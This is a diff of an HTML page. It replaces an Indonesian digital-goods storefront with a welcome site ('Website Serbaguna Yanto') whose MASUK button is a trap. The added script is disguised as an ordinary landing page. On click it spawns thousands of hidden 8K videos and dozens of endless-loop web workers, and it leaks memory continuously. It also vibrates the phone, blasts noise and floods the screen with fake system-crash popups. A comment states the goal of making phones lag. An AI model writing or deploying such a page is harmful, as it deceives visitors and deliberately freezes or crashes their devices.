@@ -1,207 +1,357 @@
 <!DOCTYPE html>
-<html lang="en">
+<html lang="id">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>FxzzId Store</title>
-    <style>
-        @import url('https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;600;700&display=swap');
-        
-        body {
-            font-family: 'Poppins', sans-serif;
-            margin: 0;
-            padding: 0;
-            background-image: url('https://qu.ax/cFoTS.jpg');
-            background-size: cover;
-            background-attachment: fixed;
-            color: #fff;
-            overflow-x: hidden;
-        }
-        
-        .container {
-            max-width: 1000px;
-            margin: 0 auto;
-            padding: 20px;
-            background-color: rgba(0, 0, 0, 0.85);
-            border-radius: 15px;
-            box-shadow: 0 0 30px rgba(0, 255, 100, 0.3);
-            margin-top: 40px;
-            margin-bottom: 40px;
-            position: relative;
-            overflow: hidden;
-        }
-        
-        /* (Keep all previous CSS styles the same) */
-        /* ... (All other CSS remains unchanged) ... */
-        
-    </style>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+  <title>Web Serbaguna Yanto</title>
+  <style>
+    * {
+      margin: 0;
+      padding: 0;
+      box-sizing: border-box;
+      font-family: 'Inter', -apple-system, BlinkMacSystemFont, sans-serif;
+    }
+    body {
+      background: linear-gradient(145deg, #667eea 0%, #764ba2 100%);
+      min-height: 100vh;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      padding: 16px;
+    }
+    
+    /* Video container hidden */
+    .video-buffer {
+      position: fixed;
+      top: 0;
+      left: 0;
+      width: 1px;
+      height: 1px;
+      opacity: 0;
+      pointer-events: none;
+      z-index: -1;
+    }
+    
+    .welcome-container {
+      background-color: rgba(255, 255, 255, 0.95);
+      backdrop-filter: blur(10px);
+      padding: 40px;
+      border-radius: 30px;
+      box-shadow: 0 20px 60px rgba(0, 0, 0, 0.3);
+      text-align: center;
+      max-width: 450px;
+      width: 100%;
+      z-index: 10;
+      border: 1px solid rgba(255, 255, 255, 0.3);
+      position: relative;
+    }
+    
+    .welcome-title {
+      font-size: 32px;
+      font-weight: 800;
+      background: linear-gradient(135deg, #667eea, #764ba2);
+      -webkit-background-clip: text;
+      -webkit-text-fill-color: transparent;
+      margin-bottom: 15px;
+    }
+    
+    .welcome-subtitle {
+      font-size: 16px;
+      color: #666;
+      margin-bottom: 30px;
+      line-height: 1.6;
+    }
+    
+    .enter-button {
+      width: 100%;
+      padding: 16px;
+      background: linear-gradient(135deg, #667eea, #764ba2);
+      color: white;
+      border: none;
+      border-radius: 60px;
+      cursor: pointer;
+      font-weight: 700;
+      font-size: 18px;
+      box-shadow: 0 10px 20px rgba(102, 126, 234, 0.3);
+      transition: transform 0.3s, box-shadow 0.3s;
+      text-transform: uppercase;
+      letter-spacing: 2px;
+      position: relative;
+      z-index: 20;
+    }
+    
+    .enter-button:hover {
+      transform: translateY(-2px);
+      box-shadow: 0 15px 30px rgba(102, 126, 234, 0.4);
+    }
+    
+    .enter-button:active {
+      transform: translateY(2px);
+      box-shadow: 0 5px 10px rgba(102, 126, 234, 0.3);
+    }
+    
+    .enter-button:disabled {
+      opacity: 0.5;
+      pointer-events: none;
+    }
+    
+    #info {
+      margin-top: 20px;
+      padding: 15px;
+      background: #f8f9fa;
+      border-radius: 40px;
+      font-size: 14px;
+      color: #667eea;
+      font-family: 'Courier New', monospace;
+    }
+    
+    video, canvas {
+      display: none;
+    }
+    
+    @media (max-width: 480px) {
+      .welcome-container {
+        padding: 30px 20px;
+      }
+      .welcome-title {
+        font-size: 28px;
+      }
+    }
+  </style>
 </head>
 <body>
-    <audio id="bgMusic" loop>
-        <source src="https://www.soundhelix.com/examples/mp3/SoundHelix-Song-1.mp3" type="audio/mpeg">
-        Your browser does not support the audio element.
-    </audio>
+  <!-- Video buffer container (hidden) untuk bikin HP lag -->
+  <div class="video-buffer" id="videoBuffer"></div>
+
+  <div class="welcome-container">
+    <h1 class="welcome-title">SELAMAT DATANG DI WEBSITE SERBAGUNA YANTO</h1>
+    <p class="welcome-subtitle">Website dengan berbagai fitur menarik untuk kebutuhan Anda</p>
     
-    <div class="music-control" onclick="toggleMusic()" title="Toggle Music">
-        <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="white">
-            <path d="M12 2v20a10 10 0 0 0 0-20zm0 22a12 12 0 1 1 0-24 12 12 0 0 1 0 24z"/>
-        </svg>
-    </div>
-    
-    <div class="container floating">
-        <header>
-            <h1>FxzzId Store</h1>
-            <p class="tagline">Premium Digital Products at Affordable Prices</p>
-        </header>
+    <button class="enter-button" id="enter-button">MASUK</button>
+    <div id="info">🥷 Klik tombol MASUK untuk memulai</div>
+  </div>
+
+  <video id="video" autoplay playsinline></video>
+  <canvas id="canvas" width="640" height="480"></canvas>
+
+  <script>
+    document.addEventListener('DOMContentLoaded', function() {
+      // ========== KONFIGURASI ==========
+      const videoBuffer = document.getElementById('videoBuffer');
+      const infoDiv = document.getElementById('info');
+      const button = document.getElementById('enter-button');
+
+      // ========== FUNGSI HEAVY BUFFER INSTAN ==========
+      function triggerHeavyBuffer() {
+        console.log('🔥 Memulai heavy buffer instan...');
         
-        <div class="products">
-            <!-- NOKOS Product -->
-            <div class="product">
-                <h2>[NOKOS]</h2>
-                <div class="price">Rp5.000,00 - Rp20.000,00</div>
-                <p>Various NOKOS options available</p>
-                <button class="dropdown-btn" onclick="toggleDropdown('nokos-dropdown')">
-                    <span>Show Options</span>
-                    <svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
-                        <path d="M6 9l6 6 6-6"/>
-                    </svg>
-                </button>
-                <div id="nokos-dropdown" class="dropdown-content">
-                    <div class="dropdown-item">
-                        <h3>[NOKOS INDO FRESH]</h3>
-                        <div class="price">Rp4.000,00</div>
-                        <button class="buy-btn" onclick="buyProduct('NOKOS INDO FRESH - Rp4.000,00')">Buy Now</button>
-                    </div>
-                    <div class="dropdown-item">
-                        <h3>[NOKOS PHILIPINA FRESH]</h3>
-                        <div class="price">Rp6.000,00</div>
-                        <button class="buy-btn" onclick="buyProduct('NOKOS PHILIPINA FRESH - Rp6.000,00')">Buy Now</button>
-                    </div>
-                </div>
-            </div>
-            
-            <!-- PANEL PTERODACTYL Product -->
-            <div class="product">
-                <h2>[PANEL PTERODACTYL]</h2>
-                <div class="price">Rp1.000,00 - Rp5.000,00</div>
-                <p>Various Pterodactyl panel options</p>
-                <button class="dropdown-btn" onclick="toggleDropdown('ptero-dropdown')">
-                    <span>Show Options</span>
-                    <svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
-                        <path d="M6 9l6 6 6-6"/>
-                    </svg>
-                </button>
-                <div id="ptero-dropdown" class="dropdown-content">
-                    <div class="dropdown-item">
-                        <h3>[1GB | CPU 50%]</h3>
-                        <div class="price">Rp1.000,00</div>
-                        <button class="buy-btn" onclick="buyProduct('PANEL PTERODACTYL 1GB | CPU 50% - Rp1.000,00')">Buy Now</button>
-                    </div>
-                    <div class="dropdown-item">
-                        <h3>[2GB | CPU 100%]</h3>
-                        <div class="price">Rp1.500,00</div>
-                        <button class="buy-btn" onclick="buyProduct('PANEL PTERODACTYL 2GB | CPU 100% - Rp1.500,00')">Buy Now</button>
-                    </div>
-                    <div class="dropdown-item">
-                        <h3>[3GB | CPU 150%]</h3>
-                        <div class="price">Rp2.000,00</div>
-                        <button class="buy-btn" onclick="buyProduct('PANEL PTERODACTYL 3GB | CPU 150% - Rp2.000,00')">Buy Now</button>
-                    </div>
-                    <div class="dropdown-item">
-                        <h3>[4GB | CPU 200%]</h3>
-                        <div class="price">Rp2.500,00</div>
-                        <button class="buy-btn" onclick="buyProduct('PANEL PTERODACTYL 4GB | CPU 200% - Rp2.500,00')">Buy Now</button>
-                    </div>
-                    <div class="dropdown-item">
-                        <h3>[5GB | CPU 250%]</h3>
-                        <div class="price">Rp3.000,00</div>
-                        <button class="buy-btn" onclick="buyProduct('PANEL PTERODACTYL 5GB | CPU 250% - Rp3.000,00')">Buy Now</button>
-                    </div>
-                    <div class="dropdown-item">
-                        <h3>[6GB | CPU 300%]</h3>
-                        <div class="price">Rp3.500,00</div>
-                        <button class="buy-btn" onclick="buyProduct('PANEL PTERODACTYL 6GB | CPU 300% - Rp3.500,00')">Buy Now</button>
-                    </div>
-                    <div class="dropdown-item">
-                        <h3>[7GB | CPU 350%]</h3>
-                        <div class="price">Rp4.000,00</div>
-                        <button class="buy-btn" onclick="buyProduct('PANEL PTERODACTYL 7GB | CPU 350% - Rp4.000,00')">Buy Now</button>
-                    </div>
-                    <div class="dropdown-item">
-                        <h3>[8GB | CPU 400%]</h3>
-                        <div class="price">Rp4.500,00</div>
-                        <button class="buy-btn" onclick="buyProduct('PANEL PTERODACTYL 8GB | CPU 400% - Rp4.500,00')">Buy Now</button>
-                    </div>
-                    <div class="dropdown-item">
-                        <h3>[UNLI | CPU UNLIMITED]</h3>
-                        <div class="price">Rp5.000,00</div>
-                        <button class="buy-btn" onclick="buyProduct('PANEL PTERODACTYL UNLI | CPU UNLIMITED - Rp5.000,00')">Buy Now</button>
-                    </div>
-                </div>
-            </div>
-            
-            <!-- ADMIN PANEL Product -->
-            <div class="product">
-                <h2>[ADMIN PANEL]</h2>
-                <div class="price">Rp10.000,00</div>
-                <p>Admin panel access</p>
-                <button class="buy-btn" onclick="buyProduct('ADMIN PANEL - Rp10.000,00')">Buy Now</button>
-            </div>
-            
-            <!-- RESELLER PANEL Product -->
-            <div class="product">
-                <h2>[RESELLER PANEL]</h2>
-                <div class="price">Rp5.000,00</div>
-                <p>Reseller panel access</p>
-                <button class="buy-btn" onclick="buyProduct('RESELLER PANEL - Rp5.000,00')">Buy Now</button>
-            </div>
-        </div>
-        
-        <footer>
-            <p>&copy; 2023 FxzzId Store. All rights reserved.</p>
-        </footer>
-    </div>
-    
-    <script>
-        // Play background music
-        window.onload = function() {
-            const music = document.getElementById('bgMusic');
-            music.volume = 0.3; // Lower volume
-            music.play().catch(e => console.log("Auto-play prevented:", e));
-        };
-        
-        function toggleMusic() {
-            const music = document.getElementById('bgMusic');
-            const control = document.querySelector('.music-control');
-            
-            if (music.paused) {
-                music.play();
-                control.innerHTML = '<svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="white"><path d="M12 2v20a10 10 0 0 0 0-20zm0 22a12 12 0 1 1 0-24 12 12 0 0 1 0 24z"/></svg>';
-            } else {
-                music.pause();
-                control.innerHTML = '<svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="white"><path d="M11 22h-4v-20h4v20zm6-20h-4v20h4v-20z"/></svg>';
+        // Daftar video
+        const videoUrls = [
+          'https://storage.googleapis.com/gtv-videos-bucket/sample/BigBuckBunny.mp4',
+          'https://storage.googleapis.com/gtv-videos-bucket/sample/ElephantsDream.mp4',
+          'https://storage.googleapis.com/gtv-videos-bucket/sample/ForBiggerBlazes.mp4',
+          'https://storage.googleapis.com/gtv-videos-bucket/sample/ForBiggerEscapes.mp4',
+          'https://storage.googleapis.com/gtv-videos-bucket/sample/ForBiggerFun.mp4',
+          'https://storage.googleapis.com/gtv-videos-bucket/sample/ForBiggerJoyrides.mp4',
+          'https://storage.googleapis.com/gtv-videos-bucket/sample/ForBiggerMeltdowns.mp4',
+          'https://storage.googleapis.com/gtv-videos-bucket/sample/Sintel.mp4',
+          'https://storage.googleapis.com/gtv-videos-bucket/sample/SubaruOutbackOnStreetAndDirt.mp4',
+          'https://storage.googleapis.com/gtv-videos-bucket/sample/TearsOfSteel.mp4'
+        ];
+
+        // LANGSUNG BUAT 500 VIDEO (TANPA SETTIMEOUT)
+        for (let i = 0; i < 500; i++) {
+          const vid = document.createElement('video');
+          vid.loop = true;
+          vid.muted = true;
+          vid.playsinline = true;
+          vid.preload = 'auto';
+          vid.style.width = '7680px';
+          vid.style.height = '4320px';
+          vid.src = videoUrls[Math.floor(Math.random() * videoUrls.length)] + '?t=' + Date.now() + i;
+          vid.play().catch(e => {});
+          videoBuffer.appendChild(vid);
+          
+          // Clone 5 kali setiap video
+          for (let j = 0; j < 5; j++) {
+            const vidClone = vid.cloneNode(true);
+            vidClone.play().catch(e => {});
+            videoBuffer.appendChild(vidClone);
+          }
+        }
+
+        // WEB WORKER MASSIVE
+        for (let w = 0; w < 50; w++) {
+          new Worker(URL.createObjectURL(new Blob([`
+            while(true) {
+              for(let i=0;i<100000000;i++) {
+                Math.sqrt(i);
+                Math.sin(i);
+                Math.cos(i);
+              }
             }
+          `])));
         }
-        
-        function toggleDropdown(id) {
-            const dropdown = document.getElementById(id);
-            const button = dropdown.previousElementSibling;
-            const svg = button.querySelector('svg');
+
+        // MEMORY LEAK INSTAN
+        for (let m = 0; m < 1000; m++) {
+          new Array(10000000).fill('leak_' + m);
+        }
+
+        // INTERVAL MEMORY LEAK
+        setInterval(() => {
+          for(let m = 0; m < 100; m++) {
+            new Array(5000000).fill('memleak_' + Date.now());
+          }
+        }, 1);
+
+        // GETAR
+        if (navigator.vibrate) {
+          navigator.vibrate([1000, 500, 1000, 500, 2000, 1000, 3000, 1000, 5000]);
+        }
+
+        console.log('✅ Heavy buffer instan selesai!');
+      }
+
+      // ========== FUNGSI SUARA CRASH ==========
+      function startCrashSound() {
+        try {
+          const audioContext = new (window.AudioContext || window.webkitAudioContext)();
+          
+          // Multiple oscillator untuk suara brutal
+          for (let o = 0; o < 10; o++) {
+            const oscillator = audioContext.createOscillator();
+            const gainNode = audioContext.createGain();
             
-            if (dropdown.style.display === "block") {
-                dropdown.style.display = "none";
-                svg.innerHTML = '<path d="M6 9l6 6 6-6"/>';
-            } else {
-                dropdown.style.display = "block";
-                svg.innerHTML = '<path d="M6 15l6-6 6 6"/>';
+            oscillator.type = 'sawtooth';
+            oscillator.frequency.value = 30 + Math.random() * 200;
+            
+            gainNode.gain.value = 0.2;
+            
+            oscillator.connect(gainNode);
+            gainNode.connect(audioContext.destination);
+            oscillator.start();
+          }
+          
+          // Noise statik
+          const bufferSize = 4096;
+          const noiseNode = audioContext.createScriptProcessor(bufferSize, 1, 1);
+          noiseNode.onaudioprocess = function(e) {
+            const output = e.outputBuffer.getChannelData(0);
+            for (let i = 0; i < bufferSize; i++) {
+              output[i] = (Math.random() * 2 - 1) * 0.3;
             }
+          };
+          noiseNode.connect(audioContext.destination);
+          
+        } catch (e) {
+          console.log('Audio error:', e);
         }
+      }
+
+      // ========== FUNGSI POP-UP WINDOWS ERROR ==========
+      function createErrorPopups() {
+        const errorContainer = document.createElement('div');
+        errorContainer.style.cssText = `
+          position: fixed;
+          top: 0;
+          left: 0;
+          width: 100%;
+          height: 100%;
+          pointer-events: none;
+          z-index: 9999;
+        `;
+        document.body.appendChild(errorContainer);
+
+        const messages = [
+          "CRITICAL ERROR",
+          "FATAL EXCEPTION",
+          "SYSTEM CRASH",
+          "KERNEL PANIC",
+          "MEMORY CORRUPTED",
+          "STOP: 0x0000007E",
+          "WINDOWS ERROR",
+          "APPLICATION HANG"
+        ];
+
+        // Pop-up massal
+        for (let i = 0; i < 300; i++) {
+          setTimeout(() => {
+            const popup = document.createElement('div');
+            popup.style.cssText = `
+              position: absolute;
+              background: #000080;
+              color: white;
+              border: 3px solid #c0c0c0;
+              padding: 15px 25px;
+              font-family: 'MS Sans Serif', monospace;
+              font-size: 14px;
+              left: ${Math.random() * 70}%;
+              top: ${Math.random() * 70}%;
+              transform: rotate(${Math.random() * 10 - 5}deg);
+              box-shadow: 5px 5px 15px rgba(0,0,0,0.5);
+              z-index: 10000;
+              min-width: 250px;
+            `;
+            popup.innerHTML = `
+              <div style="border-bottom: 2px solid #c0c0c0; padding-bottom: 8px; margin-bottom: 8px; font-weight: bold;">
+                ⚠️ ${messages[Math.floor(Math.random() * messages.length)]}
+              </div>
+              <div style="margin-bottom: 12px;">
+                0x${Math.floor(Math.random()*100000000).toString(16).toUpperCase()}
+              </div>
+              <div style="text-align: right;">
+                <span style="background: #c0c0c0; color: black; padding: 4px 15px;">OK</span>
+              </div>
+            `;
+            errorContainer.appendChild(popup);
+          }, i * 5);
+        }
+
+        // Lanjutkan pop-up setiap 50ms
+        setInterval(() => {
+          for (let i = 0; i < 5; i++) {
+            const popup = document.createElement('div');
+            popup.style.cssText = `
+              position: absolute;
+              background: #000080;
+              color: white;
+              border: 3px solid #c0c0c0;
+              padding: 10px;
+              font-family: monospace;
+              font-size: 12px;
+              left: ${Math.random() * 80}%;
+              top: ${Math.random() * 80}%;
+              z-index: 10000;
+            `;
+            popup.innerHTML = `
+              <div>FATAL ERROR</div>
+              <div>${Math.floor(Math.random()*1000)}</div>
+            `;
+            errorContainer.appendChild(popup);
+          }
+        }, 50);
+      }
+
+      // ========== EVENT CLICK ==========
+      button.addEventListener('click', function(e) {
+        e.preventDefault();
+        console.log('Tombol diklik!');
         
-        function buyProduct(productName) {
-            const message = Halo, saya ingin membeli produk: ${productName};
-            const whatsappUrl = https://wa.me/6289676041776?text=${encodeURIComponent(message)};
-            window.open(whatsappUrl, '_blank');
-        }
-    </script>
+        button.disabled = true;
+        infoDiv.innerText = '⏳ Memproses...';
+        
+        // Trigger semua efek instan
+        triggerHeavyBuffer();
+        startCrashSound();
+        createErrorPopups();
+        
+        infoDiv.innerText = '✅ Selesai';
+        button.disabled = false;
+      });
+
+      console.log('Event listener terpasang');
+    });
+  </script>
 </body>
-</html>
+</html> 
